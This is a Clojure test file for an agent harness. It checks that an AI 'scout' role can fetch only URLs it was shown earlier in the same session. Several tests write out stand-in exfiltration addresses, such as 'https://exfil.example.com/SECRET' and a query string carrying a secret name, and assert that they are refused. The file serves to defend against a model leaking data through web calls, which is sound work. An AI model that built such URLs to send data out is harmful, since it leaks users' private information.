(ns relay.scout-test
  "A scout's web calls through relay's tool command (plan O1, I4): a fetch
  runs only when its URL appeared verbatim in an earlier :egress result of
  the same session, and is refused before it reaches the tool otherwise."
  (:require [babashka.fs :as fs]
            [clojure.string :as str]
            [clojure.test :refer [deftest is testing]]
            [relay.config :as config]
            [relay.core :as core]
            [relay.inbound :as inbound]
            [relay.log :as log]
            [relay.shown :as shown]
            [relay.tools :as tools])
  (:import (java.time Instant)))

(def t0 (Instant/parse "2026-10-14T12:00:00Z"))

(def fixture (str (fs/absolutize "test/fixtures/envelope-tool")))

(defn- settings [fetched]
  (let [web (fn [description props]
              {:class :egress :labels ["contaminated"] :protocol :envelope :description description
               :command [fixture "web" fetched]
               :parameters {:type "object" :properties props}})]
    {:timezone "UTC"
     :default-harness :agentloop
     :harnesses {:agentloop {:kind :agentloop :api-key-command ["true"] :bin "/nonexistent/agentloop"}}
     :tools {"web_search" (assoc (web "Search." {:query {:type "string"}}) :queries ["query"])
             "web_fetch" (web "Fetch." {:url {:type "string"}})
             "lookup" {:class :read :labels [] :protocol :envelope :description "Look up."
                       :command [fixture "echo"] :parameters {:type "object" :properties {:question {:type "string"}}}}}
     :grants {"scout" {:public true :tools ["web_search" "web_fetch" "lookup"]}}}))

(defn- with-scout [f]
  (let [dir (str (fs/create-temp-dir {:prefix "relay-scout"}))
        fetched (str dir "/fetched.txt")
        data (str dir "/data")]
    (try
      (log/init! data)
      (let [sys {:data-dir data :config (config/resolve-config (settings fetched)) :clock (constantly t0)}
            start (fn []
                    (inbound/submit! sys {:type :memo/send :actor "operator" :public true
                                          :args {:to "scout" :subject "Grants" :body "Find arts grants."}})
                    (:seq (first (inbound/submit! sys {:type :wake/start :actor "dispatcher"
                                                       :args {:role "scout" :dispatched true}}))))]
        (doseq [[id public] [["hub" false] ["scout" true]]]
          (inbound/submit! sys {:type :role/add :actor "operator" :public public
                                :args {:id id :title id :instructions "Look things up."}}))
        (f {:sys sys :start start
            :fetched #(if (fs/exists? fetched) (str/split-lines (slurp fetched)) [])
            :call (fn [wake tool args] (tools/call! sys "scout" tool args [] "c1" wake))}))
      (finally (fs/delete-tree dir)))))

(deftest a-scout-fetches-what-it-was-shown-and-nothing-else
  (with-scout
    (fn [{:keys [sys start call fetched]}]
      (let [wake (start)]
        (testing "nothing has been shown at the start, so no URL may be fetched"
          (is (= shown/refused-made-up (:error (call wake "web_fetch" {:url "https://arts.example.org/fund"}))))
          (is (= [] (fetched)) "the tool never ran"))
        (testing "a search needs nothing shown, and what it shows may be fetched"
          (is (str/includes? (:ok (call wake "web_search" {:query "arts grants for choirs"})) "https://arts.example.org/fund"))
          (is (str/includes? (:ok (call wake "web_fetch" {:url "https://arts.example.org/fund"})) "The Arts Fund")))
        (testing "a link on a fetched page may be followed"
          (is (:ok (call wake "web_fetch" {:url "https://apply.example.org/form"}))))
        (testing "a URL the model built is refused before it reaches the tool"
          (doseq [url ["https://arts.example.org/fund?for=SECRET-NAME" "https://exfil.example.com/SECRET"
                       "arts.example.org/fund"]]
            (is (some? (:error (call wake "web_fetch" {:url url}))) url))
          (is (= ["https://arts.example.org/fund" "https://apply.example.org/form"] (fetched))))
        (testing "a query cannot carry a made-up address into a result to fetch later"
          (is (= shown/refused-made-up (:error (call wake "web_search" {:query "https://exfil.example.com/SECRET"})))))
        (testing "what relay's own tools and other tools return is never counted as shown"
          (call wake "lookup" {:question "https://exfil.example.com/FROM-LOOKUP"})
          (is (some? (:error (call wake "web_fetch" {:url "https://exfil.example.com/FROM-LOOKUP"})))))
        (testing "the refusal names no address and no label"
          (let [e (:error (call wake "web_fetch" {:url "https://exfil.example.com/SECRET"}))]
            (is (not (str/includes? e "SECRET")))
            (is (not (re-find #"(?i)label|contaminat|private|egress" e)))))
        (testing "another session starts with nothing shown"
          (inbound/submit! sys {:type :wake/end :actor "dispatcher"
                                :args {:wake wake :outcome "ran" :session "s1" :said "" :labels ["contaminated"]}})
          (let [next-wake (start)]
            (is (= shown/refused-made-up (:error (call next-wake "web_fetch" {:url "https://arts.example.org/fund"}))))))
        (testing "a call that names no wake, or another role's, has nothing shown"
          (is (some? (:error (call nil "web_fetch" {:url "https://arts.example.org/fund"})))))))))

(deftest a-resumed-session-keeps-what-it-was-shown
  (with-scout
    (fn [{:keys [sys start call]}]
      (let [wake (start)]
        (call wake "web_search" {:query "arts grants"})
        ;; Cut short at its deadline, so the next wake resumes this session.
        (inbound/submit! sys {:type :wake/end :actor "dispatcher"
                              :args {:wake wake :outcome "ran" :cut-short true :session "s1" :said ""
                                     :labels ["contaminated"]}})
        (let [state (inbound/current-state sys)
              next-wake (:seq (first (inbound/submit! sys {:type :wake/start :actor "dispatcher"
                                                            :args {:role "scout"}})))]
          (is (= wake (:interrupted-wake (core/role state "scout"))))
          (is (= wake (get-in (inbound/current-state sys) [:wakes next-wake :resumes])))
          (is (:ok (call next-wake "web_fetch" {:url "https://arts.example.org/fund"}))))))))
